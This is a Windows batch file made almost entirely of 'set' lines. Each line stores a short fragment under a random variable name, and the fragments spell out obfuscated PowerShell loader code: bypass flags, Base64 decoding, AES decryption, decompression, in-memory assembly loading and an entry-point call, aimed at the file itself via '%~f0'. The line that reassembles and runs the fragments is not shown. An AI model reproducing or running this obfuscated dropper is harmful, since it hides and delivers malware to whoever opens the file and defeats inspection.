@echo off
set "jRlWxnrzRH=YxVw"
set "gXhZcADqEI=-joi"
set "juLyOBVoUE=SKii"
set "CkUhReNxSj=y]::"
set "JlrkdohNbi=);$C"
set "MYUAMiHlVb=sion"
set "XCPHpgiqkG=Secu"
set "cjGDPrIJvY=Disp"
set "DbNyxuNvMH= = N"
set "DhgUwOuhXE=F'[-"
set "MwzWKdMuSL=ck($"
set "UZtTGKduYO=gnir"
set "dUYgYblXjr=Mode"
set "RpxiNFBuvy=Invo"
set "rVBnZrFoeM=mBua"
set "alDnDwesqQ=Obje"
set "mDmETmIJbA=);$r"
set "lneqhpAOwm=PTtG"
set "cDIeddramo=L4Yi"
set "dbHDCjJvpj=oL'["
set "pqkVRIdOdK=morF"
set "huliVlpXVI=DN.D"
set "OJHwSmHIUG='')("
set "zjyPMSedfs== $C"
set "KrRsigJgHC= [st"
set "ZwCEyBImMf=m(, "
set "AUHpVnzifv=3); "
set "ndWrIzlyaq=$rYA"
set "TORAnVyKhk=yste"
set "GVdtsbbOiY=bjec"
set "ckReqDqkXq=();$"
set "Lyqrydhwpk=pose"
set "YZFQNFlSzl=hxWW"
set "UeVgbEpqTW== [S"
set "XDevLPyOSX=sb, "
set "TMAvyydaAs=O.Me"
set "PovbcUqAEl=le  "
set "SWoxnNKhra=null"
set "PrGUfAURms=$LrD"
set "uFbTfxClhy=)($y"
set "ZQhsaQAMZZ=Syst"
set "phgKmjkgWQ=7;$C"
set "EPyasxwzFJ=16] "
set "UucvviIXIE=[]] "
set "qwVxooUEGm='[-1"
set "JLkCOXmavu=[Sys"
set "aBEbYBuyHW=($mA"
set "cIHrIXVjSH=iron"
set "CNKdTAMcut=Kii."
set "FobgdwzAsh=hxWW"
set "dGypEQrpKQ=Secu"
set "DqldgzSiGR=comm"
set "UhEddbgpCH=V = "
set "rJHVtOSZto=tem."
set "PWPOKpbGFu=raph"
set "CuVHoXxRwh=ay()"
set "AAwReLrOkL=.Key"
set "MtVwSmeFGa=-Obj"
set "JuHwXtvpUw=tsWi"
set "YxhvMsJkIe=ct S"
set "GwyEIftDrZ=Bmor"
set "kjORqbDOPC=Hsb."
set "ObqLpWxOFp=tem."
set "MdHNOIIpdI=$ldH"
set "MCDmQVmyhI=lit("
set "WpzTBGMJeh=ss -"
set "LsIuaAhySX=PHSG"
set "LHODLkchoY=.Mod"
set "sZnNoRlyKA=urit"
set "OajwnMQDLA=ypto"
set "biJRjDtWVL=Conv"
set "JbWOrhlGeX=:: '"
set "CElyRosGVw=.Cop"
set "pvQcXZOrWz=WIPW"
set "qrttEsETxl=, $y"
set "bIjugIFoCR=fore"
set "VdhUPlnRHd=Obje"
set "zMuojBMfCG=::De"
set "AkGOiEjeoP=tryP"
set "ppILZkRgFS=n ''"
set "mrOWZDRAdE=PKCS"
set "adGzwfWWiG=ne);"
set "VvErZQAOZt=1..-"
set "PwHqlqzXcR=[-1."
set "XkHVmuxbOk=] -j"
set "eHriEwHaLG=ecry"
set "MXTpPRpMsZ=Comp"
set "qbCWBFqswN=BC;$"
set "UVdoPZhhqQ=rtS4"
set "iTsUWisGYM=.Con"
set "tJGIsYGvfi=WL.T"
set "GkkwVEAwRH=.Mem"
set "GpTNeaZRVz=WIPW"
set "YzBhHsekPX=gjYA"
set "nwDAjUDQpH=yhxW"
set "zptXaIeJpU=ldHs"
set "ylYLHnCldZ=eMVs"
set "zBYLsNOQYF=pres"
set "cZVtCBmqqb=  $i"
set "OpndRQRRrZ=and "
set "IsQBmhtnQa=flec"
set "MGwTyLXSrw=eam("
set "VOIRhmBcbG= [Sy"
set "MlbzCzmsTr=ct S"
set "WtkqUQxQFl=);$R"
set "nGEIfFVYGX=; };"
set "NcuMNvAYIY=WIPW"
set "VronDjmESe=$rYA"
set "qaXpzWpHTM=$yhx"
set "SvVlVANFIh=onve"
set "RPqeQqYNiY=hy.A"
set "PePhoLuxBT=Fina"
set "ALbuDcnaFL=stem"
set "jUZDUrXtBj=esaB"
set "IHUeBgLyqH=e = "
set "QmCRgxdYud=();$"
set "JIlmFtploe=.IO."
set "kSCMSpZziG=oArr"
set "JywMEcCVit=]::("
set "kpepBHbwbK= [Sy"
set "NPgiGLcljY=106u"
set "WosrzUTFwt=comp"
set "lWdeMxlpxp=ateD"
set "BXaEBOhgCf=m.Re"
set "sNsEiIxSMJ=t Sy"
set "gpOOTiBbiJ=ress"
set "XstqvIAyKO=]::C"
set "svWpYqvytp=CFxo"
set "JSseFupCPP=.Com"
set "wpXlQHSQbq=form"
set "nKggWZJPGU=Comp"
set "yGINVghmZV=in $"
set "iPlWWfkaML= = $"
set "EEppwXJZhr=N = "
set "LFXOTHXufw=.Sec"
set "NOOQpZruao=dj0C"
set "KtRDYbuLYo=vBnE"
set "hLdtpdUlES=ewLi"
set "nBirieAOwp=mory"
set "pVqlCFhGLU=y.Pa"
set "vFHShTqAwI=lBlo"
set "tgcgAzMbPo=WIPW"
set "fnqKVtXAQn=ptog"
set "dpYgCDgaKr=yTo("
set "XbLUHYZZKN=.Cry"
set "xiNNnBXpng=embl"
set "YISgaDAiDg=Syst"
set "LUpcKaGBxu=rity"
set "eTxcKDUWwA=nirt"
set "FPFSHiFChz=EWL."
set "qDDPEAxvzl=m.IO"
set "VvHkFUUIQq=y.Cr"
set "FDPqnmgpxP=-joi"
set "IoPPYhHxVt=('Tg"
set "cUeRieMjdt=S46e"
set "sPhXHrAlqF=TllA"
set "gjqFEmLnQQ=;$RS"
set "LTBwYDcVZZ=g = "
set "QAnuKlbBeh='[-1"
set "kBIpWoPSOe==');"
set "fyfvFIHESI=join"
set "FDcSitotUg=ew-O"
set "njZtTXoCys=ion."
set "PoKHbQuhwD=yhxW"
set "rlDECEnFzG=ing("
set "TtQAKCYzvS=ionM"
set "uagUSbaNai=W = "
set "RtEsueuaio=('da"
set "CVYTecbSAn=.Cre"
set "pwotwjtVeQ= '')"
set "ZwQuexpTDN=[Sys"
set "RMksVKbVop=W = "
set "zoixvXrgvj=eV ="
set "XUVtAAtEnN=ach "
set "yDHZIVUcUQ=th('"
set "dtirHhYCqi=);$L"
set "DhZoYFOLdQ='0Pg"
set "JsgLUmsmHe=m.IO"
set "aMGWplDDrC=H.En"
set "dANgVRMhSZ=, (,"
set "wGysqoGKoA=saBm"
set "ojvjPptWCL=();$"
set "XoORMkXeiq=e]::"
set "rdPoMxpPQb=sSp."
set "gjFxsXWHqi=pher"
set "tuqxrwIeIp=CWIP"
set "MDYTDftMEi=em.I"
set "vRmjlpAYIo=daeR"
set "jGzvvdDvtj=-4] "
set "aWEFUcRhDm=YAeV"
set "OJlpqaocMZ=::('"
set "zLwTRnaakg=ress"
set "YwHbTQIpwy=zHhH"
set "EMiklBeVpg=('%*'"
set "wVEdDMwIVE= '')"
set "TgLglWniqC=brea"
set "EFDYvNJfBY=)($i"
set "ajJzPaNLrg=PxEW"
set "YpvVgFqwAz=trea"
set "sxjCLrWNBk=tion"
set "CPEzVIEand=l5E7"
set "KdNqqByofL=grap"
set "VNdzRhBVDM=oryS"
set "MJSPyrsMSC=6] -"
set "PUsfLXWXPI=stem"
set "MWcAohSMZh=Stre"
set "vjVpdEkFLK=ptor"
set "PWHGPTtxvU=rofi"
set "mpuSEHNcyE=;$vB"
set "ZkYiTqFnHA=eV.T"
set "zBKBOKgDlP=mAsS"
set "TpICcpaBJi=RmAx"
set "KOxMhrinGK=gsYZ"
set "ErJmWkhHEr=zuZI"
set "GAALCiNEWJ=($mA"
set "cfKkoMpLPJ=gMod"
set "qeoXKsOTRl=WW ="
set "HCHJkjmjfw=tS46"
set "CipqWjzpWg=yste"
set "DJhmfhlLDF=EWL "
set "GguAtnmGiW=PW.I"
set "IcbOixufMv=.-16"
set "dosvxzTlcq=('%~f0'"
set "mGEMySezbh=$KIE"
set "vwArCEKuic=se()"
set "usiIQkUjKU=n ''"
set "aHNjPRIqTe=nage"
set "SyjSZGCTli=s75K"
set "fYhoqHxTfP=mBua"
set "UPIluPidEC= = ["
set "ViLgcTQPoU=-nop"
set "QRCKvYDuEl=1] -"
set "unjTDKxFpU=6esa"
set "FpUJqEaZqK=pose"
set "SbziDaZiha=oin "
set "NpdyZXeejr=-ep "
set "JbIbpZxlON=rity"
set "TdSHxzBImG=sSp "
set "IxHJvUUmis=ert]"
set "IvdEvqUajW=ke($"
set "QchucYWbTr=vert"
set "GUTBqdghWI=tem."
set "tHzvIzKPYp=-1.."
set "RKNuzKseQn=rt]:"
set "LieGuwHGJl===')"
set "GMTyAVbZVa=ring"
set "sBXqTzhJzs=eV);"
set "bktOsMxxhv=ress"
set "QPDPABeRJi='txe"
set "fajNbUMnbp=raph"
set "KEXQtXdrFn=.Ass"
set "piLRmequnT=.Len"
set "vIgfJRIedW=W, 0"
set "MFTbDlAxsF=$yhx"
set "YKrGoZRNQv= if "
set "OtVsUthfYd=.Dis"
set "BUzZhMNOXs=[Env"
set "OADDdPLpGB=em.C"
set "jTSLXiehOo=WIPW"
set "oCiIKxEEhq=ddin"
set "dCHqomixHB=am;$"
set "fOnOfjpeaV=nEH "
set "KTLItNQobK=W.Pa"
set "oIxddYmLKV=orF'"
set "TMlisazDvT=[Sys"
set "QSXPVnuWAR=rDDN"
set "LXaYMOMkro=$CWI"
